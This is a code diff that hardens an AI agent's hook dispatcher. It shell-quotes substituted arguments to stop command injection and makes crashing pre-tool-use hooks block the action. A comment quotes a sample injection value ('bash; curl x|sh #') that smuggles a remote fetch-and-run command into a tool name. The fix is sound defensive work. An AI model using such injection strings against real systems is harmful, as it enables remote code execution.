@@ -53,11 +53,18 @@ class HookResult:
     *proceed*: if ``False`` the caller should abort the action.
     *modified_args*: if not ``None``, use these instead of the original args.
     *message*: optional message to display to the user.
+    *allow*: alias for ``proceed`` — kept for clarity at call sites that
+      phrase the result as "is this action allowed?".
     """
 
     proceed: bool = True
     modified_args: dict[str, Any] | None = None
     message: str | None = None
+
+    @property
+    def allow(self) -> bool:
+        """Alias for ``proceed`` — true if the action should be allowed."""
+        return self.proceed
 
 
 # ----------------------------------------------------------------------- #
@@ -87,10 +94,12 @@ def _make_shell_hook(
                 return HookResult()
 
         # Substitute placeholders.
+        # CRITICAL-2 fix: shell-quote every substituted value so an
+        # attacker-controlled tool name / arg (e.g., "bash; curl x|sh #")
+        # cannot break out of the rendered shell string.
         try:
-            rendered = command.format_map({
-                k: str(v) for k, v in kwargs.items()
-            })
+            quoted = {k: shlex.quote(str(v)) for k, v in kwargs.items()}
+            rendered = command.format_map(quoted)
         except KeyError:
             rendered = command
 
@@ -183,8 +192,30 @@ class HookDispatcher:
                 if asyncio.iscoroutine(result):
                     result = await result
             except Exception as exc:
+                # SECURITY fix: a PRE_TOOL_USE hook that crashes must
+                # FAIL CLOSED — otherwise a hook designed to block a
+                # dangerous action can be bypassed simply by making it
+                # raise.  POST_TOOL_USE / observational hooks fail
+                # open (log + continue) because the tool already ran.
+                fn_name = getattr(fn, "__name__", repr(fn))
+                if hook_type == HookType.PRE_TOOL_USE:
+                    logger.error(
+                        "PRE_TOOL_USE hook %s crashed — BLOCKING tool call: %s",
+                        fn_name, exc,
+                        exc_info=True,
+                    )
+                    aggregated.proceed = False
+                    aggregated.message = (
+                        f"pre-tool-use hook failed: {exc}"
+                    )
+                    # Don't run further hooks — the tool is already
+                    # blocked and later hooks shouldn't override the
+                    # fail-closed decision.
+                    return aggregated
                 logger.warning(
-                    "Hook %s for %s raised: %s", fn, hook_type.value, exc,
+                    "Hook %s for %s raised (fail-open): %s",
+                    fn_name, hook_type.value, exc,
+                    exc_info=True,
                 )
                 continue
 
